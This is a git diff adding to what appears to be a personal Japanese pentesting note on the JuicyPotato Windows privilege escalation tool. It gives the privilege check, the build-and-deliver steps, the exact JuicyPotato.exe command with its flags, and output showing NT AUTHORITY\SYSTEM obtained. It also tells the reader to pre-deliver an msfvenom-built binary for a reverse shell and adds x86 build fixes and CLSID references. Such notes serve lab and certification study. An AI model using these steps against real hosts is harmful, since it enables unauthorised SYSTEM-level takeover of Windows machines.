@@ -1,19 +1,83 @@
 # JuicyPotate
 
+* ### 前提確認
+
 ```
 whoami /priv
 ```
 
 `SeImpersonatePrivilege`権限があることを確認
 
+* ### 実行
+
 https://github.com/ohpe/juicy-potato
 
 juicy-potatoをvisual studioでコンパイルして、攻撃対象ホストに配送し、コマンドを実行する。
 
-```
+```cmd
 C:\Users\Public\UsersPublicJuicyPotato.exe -t t -p C:\Users\Public\whoami.exe -l 5837
+
+----
+# 実行結果
+C:\Users\Public>UjiycOptaot.exe -t t -p C:\Users\Public\whoami.exe -l 5837
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 5837
+......
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
 ```
 
 * -t：CreateProcessWithTokenの使用を指示する
+
 * -pフラグで実行しようとするプログラムを指定
+
 * -lフラグでCOMサーバーがリッスンするポートを任意に指定
+
+* whoami.exeは任意のバイナリファイル(mafvenomで作成して事前配送すること）
+
+  **※whoami単体できちんとリバースシェル取得できるかをまず確認する**
+
+
+
+### x86でビルドする方法
+
+* visualstudioのフォルダビューで`JuicyPotato.vcxprof`を開き、ConfigurationTypeがApplicationになっていることを確認する
+
+  ![image-20230211134602822](img/JuicyPotato/image-20230211134602822.png)
+
+* 構成プロパティ→リンカー→システムのサブシステムを変更する
+
+  【変更前】Windows (/SUBSYSTEM:WINDOWS) 
+  【変更後】コンソール (/SUBSYSTEM:CONSOLE)
+  https://detail.chiebukuro.yahoo.co.jp/qa/question_detail/q13198063873
+
+  https://learn.microsoft.com/ja-jp/cpp/build/reference/subsystem-specify-subsystem?view=msvc-170
+
+  上記サイトを参照すると、win32文字モードアプリケーションに対する設定のよう。
+  今回の修正をしたことでx64でのビルドが失敗する可能性があるので注意すること
+
+
+
+### JuicyPotateのOS対応表
+
+https://jlajara.gitlab.io/Potatoes_Windows_Privesc
+
+
+
+### CLSIDの対応表
+
+https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/
+
+
+
+### トラブルシュート
+
+FTPで転送するときは必ずバイナリモードで
+
+```cmd
+C:\Users\Public>JuicyPotato.exe
+JuicyPotato.exe
+This version of C:\Users\Public\JuicyPotato.exe is not compatible with the version of Windows you're running. Check your computer's system information and then contact the software publisher.
+```
+
